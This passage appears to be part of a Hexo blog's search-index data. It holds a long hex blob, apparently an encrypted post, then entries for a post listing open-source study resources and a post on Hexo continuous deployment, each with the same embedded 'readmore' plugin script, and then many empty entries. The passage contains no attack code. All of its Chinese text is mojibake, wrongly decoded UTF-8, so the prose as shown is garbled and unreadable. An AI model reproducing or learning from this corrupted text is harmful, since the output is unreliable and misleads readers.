f96fda723940bfe937a55112542ee06413e6a785bc3c7a2b675d21eda36bab07ba2164aa2b1d793cffd8a1cd027986191b5c09ab96c882c2e130ebc4e8a1b66e0e0580beb5dc2b7362246ff2bac81cc883bc6d05ef3837e60c90069253d2b3bf6a8489cae267fa1fa4f62eae6a219725b462b406ca236857c3b50ee2bd08324b93d65d484e14281911001467b2248d80c06c94f8f4a243da47cc40a5b2369515255a01511dc70fbc568ba166161ac45baad5d2842c4938186c7324813fc93e84aae7e6d6aa5b83aacdc14334d4bb2b19010c03b5713d93e478c9e972dbdef8dc7cd15bae2b1a5a77c48a71dd9b40f7a4c800b9cb249083fe4234c45330790cb22bad9f36ee4cce5843574b557d09e37a50efdc87e5a96746edf1f577ffa1a815eb7b40dee9ed5f0e863008b6be1add6fa986bdf7b3ce39cc17b293f5f85a85ad794fd094923686831e64e03e8abe2e68aa9b59cce29836281e2545d7c13ae5f05b266467d8bf4a8ff4583d5be8ff21f5ef73d7fad88d629f41b610d937c348f1361f5b06b738115fd262230e5b122cf0db07365c4db296f99119bd0f326f9a23168cc2866488933a7eed5a8cb5fbd7b24e5a6d9a5d2f949b09c4a819a19478c84db53ba9b5ce261a0140b9e90fbe41b90cfa162cb8973711a08ea90610a5426b5a30bfc910558d969cd5675c73fcd9b000c8ec473c09b497308b89f26d625bc9be60fa0bc0a25b68f736524b7a9043d8d9ce119c23448d81698d9088e969dbfdef19e92ba6997024c684fa1b8c82078342d14ad28562c70a1db35889f721b32eba8d7351a881d2b943a56a309f4f018042e28eccfd67603195e79a7ba9d49f56582fd57275f020cd568e8052dd77c43d4134fd004c70df72166134ed4bfaaf28c0568a393dbee3ea76b96584d3303be6f3458e949e1086edf23ca5a7aa4767bb7db4b5a90212ec8db57ba4e21044874f97bb65520422c8c5771eb3768d415389705362785bf21e05dee233c6db6074701bfa6578868d821e847a4da6f77e8df8c7d132487 è¯· è¾“ å…¥ é˜… è¯» å¯† ç .",tags:"åŠ å¯†åšå®¢ å¼€æº"},{title:"å¼€æºå­¦ä¹ èµ„æ–™æ¨è",url:"/posts/7733a21f.html",text:'å­¦ä¹ èµ„æ–™ç®—æ³• å›¾è§£ LeetCode ç®—æ³• Labuladong çš„ç®—æ³•å°æŠ„ å„ç§ç¼–ç¨‹è¯­è¨€çš„ç®—æ³•å®ç° algorithm-base - ç®—æ³•åŸºç¡€ å¤šç§ç¼–ç¨‹è¯­è¨€å®ç° LeetCodeã€ã€Šå‰‘æŒ‡ Offerï¼ˆç¬¬ 2 ç‰ˆï¼‰ã€‹ã€ã€Šç¨‹åºå‘˜é¢è¯•é‡‘å…¸ï¼ˆç¬¬ 6 ç‰ˆï¼‰ã€‹é¢˜è§£ Java Java å·¥ç¨‹å¸ˆæˆç¥ä¹‹è·¯ æˆä¸ºä¸€ä¸ªæ›´å¥½çš„ Java ç¨‹åºå‘˜ äº’è”ç½‘å…¬å¸å¸¸ç”¨ Java æ¡†æ¶æºç èµæ äº’è”ç½‘ Java å·¥ç¨‹å¸ˆè¿›é˜¶çŸ¥è¯†å®Œå…¨æ‰«ç›² Spring Spring Cloud å­¦ä¹ èµ„æº Spring Boot ä¸“æ  - æ¶µç›– Spring Boot 2.Xã€Spring Cloudã€Spring Cloud Alibabaã€Dubboã€åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ã€åˆ†å¸ƒå¼äº‹åŠ¡ç­‰å†…å®¹ GitHub GitHub æ¼«æ¸¸æŒ‡å— è½¯ä»¶å®‰å…¨ SpringBoot ç›¸å…³æ¼æ´å­¦ä¹ èµ„æ–™ï¼Œåˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§åˆé›†ï¼Œé»‘ç›’å®‰å…¨è¯„ä¼° Kubernetes Kubernetes ä¸­æ–‡æŒ‡å— / äº‘åŸç”Ÿåº”ç”¨æ¶æ„å®è·µæ‰‹å†Œ é¢è¯•èµ„æ–™ Java å­¦ä¹  + é¢è¯•æŒ‡å— ä¸€æ¬¾é¢è¯•åˆ·é¢˜çš„ Spring Cloud å¼€æºç³»ç»Ÿ æœ€æ–° 10000+ é“ï¼Œ280 å¤šä»½ Java é¢è¯•é¢˜æ±‡æ€» å…¼èŒå¤–å¿« ç¨‹åºå‘˜å¦‚ä½•ä¼˜é›…çš„æŒ£é›¶èŠ±é’± ç”µå­ä¹¦èµ„æ–™ æœ€æ–° 1000 å¤šæœ¬è®¡ç®—æœºç”µå­ä¹¦å…è´¹ä¸‹è½½ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¼€æº"},{title:"Hexo æŒç»­éƒ¨ç½²æ–¹æ¡ˆ",url:"/posts/532be336.html",text:'æ–¹æ¡ˆä¸€ Hexo å®˜æ–¹æ¨èçš„éƒ¨ç½²æ–¹æ¡ˆï¼Œæ˜¯åœ¨å…ˆæœ¬åœ°ç¼–å†™ MarkDown æºæ–‡ä»¶ï¼Œç„¶ååœ¨æœ¬åœ°æ„å»ºé™æ€èµ„æºæ–‡ä»¶ï¼Œæœ€ååŒæ­¥é™æ€èµ„æºæ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ æ–¹æ¡ˆäºŒ ç†æƒ³çš„å‘å¸ƒæ¨¡å¼ï¼Œä½¿ç”¨æœ¬åœ°çš„ MarkDown ç¼–è¾‘å™¨ + æœ¬åœ°çš„ Git å®¢æˆ·ç«¯ + è¿œç¨‹ Git æœåŠ¡å™¨çš„ Githooks / Webhooks åŠŸèƒ½æ¥å®ç°åœ¨æœ¬åœ°ç¼–å†™å’Œå®æ—¶æ„å»ºå‘å¸ƒåšå®¢ï¼ŒåŒæ—¶å€ŸåŠ©è¿œç¨‹ Git æœåŠ¡å™¨ï¼ˆGitoliteã€Githubã€Gitlabï¼‰å®ç°äº†åšå®¢æºæ–‡ä»¶çš„å¤‡ä»½ã€‚ æ–¹æ¡ˆä¸‰ å€Ÿé‰´æ–¹æ¡ˆäºŒï¼Œæœ¬åœ°ä½¿ç”¨çš„ MarkDown ç¼–è¾‘å™¨ + Git ç¼–å†™åšå®¢ï¼Œçº¿ä¸Šåˆ™é€šè¿‡ Hexo-Admin æ’ä»¶å®ç°åœ¨ Web æµè§ˆå™¨ä¸Šç¼–å†™åšå®¢ï¼›å¹¶ä¸”ä¸¤è€…éƒ½ç»“åˆäº†è¿œç¨‹ Git æœåŠ¡ç«¯çš„ Githooksï¼Œæ”¯æŒå®æ—¶æ„å»ºå’Œå‘å¸ƒåšå®¢ã€‚ä¸ºäº†åŠ é€Ÿå›½å†…å¤–è®¿é—®ç½‘ç«™çš„é€Ÿåº¦ï¼ŒåŠ å…¥äº†å¤šçº¿éƒ¨ç½²çš„æ–¹å¼ï¼Œå…¶ä¸­åŒ…æ‹¬é¢å¤–éƒ¨ç½²åˆ° Coding Pages å’Œ Github Pagesã€‚åŒæ—¶å°†åšå®¢è‡ªåŠ¨æ„å»º / éƒ¨ç½²æœåŠ¡ä¸åšå®¢æä¾›å¯¹å¤–è®¿é—®çš„ Web æœåŠ¡ï¼ˆNginxï¼‰åˆ†åˆ«éƒ¨ç½²åœ¨ä¸¤å° Linux æœåŠ¡å™¨ä¸Šï¼ŒLinux æœåŠ¡å™¨ä¹‹é—´åˆ™é€šè¿‡ Rsync åŒæ­¥ Web é™æ€èµ„æºæ–‡ä»¶ï¼Œä½¿ Hexo æŒç»­éƒ¨ç½²æ–¹æ¡ˆçš„æ€§èƒ½ã€å¯ç»´æŠ¤æ€§ä¸å¯ç”¨æ€§æ›´é«˜ã€‚ç›®å‰æœ¬ç«™çš„ Hexo æŒç»­éƒ¨ç½²æ–¹æ¡ˆé‡‡ç”¨æ–¹æ¡ˆä¸‰ï¼Œè‡ªå»ºç«™ä»¥æ¥ä¸€ç›´ç¨³å®šè¿è¡Œä¸­ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ci/cd é™æ€åšå®¢"},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""},{url:"",text:"",tags:"",title:""}]};